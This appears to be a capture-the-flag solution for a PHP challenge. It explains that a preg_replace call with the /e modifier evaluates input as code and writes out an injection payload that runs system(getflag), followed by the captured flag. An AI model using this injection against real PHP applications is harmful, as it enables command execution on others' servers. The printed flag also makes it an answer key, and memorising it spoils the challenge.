HINT:
use a php beautifier and https://regex101.com/

ANSWER:
We use a php beautifier and https://regex101.com/, we see this line:
preg_replace("/(\[x (.*)\])/e", "y(\"\")", $a);
there is a know exploit with /e so we can abuse it.
run:
echo '[x {${system(getflag)}}]' > /tmp/exploit
and we get:
wiok45aaoguiboiki2tuin6ub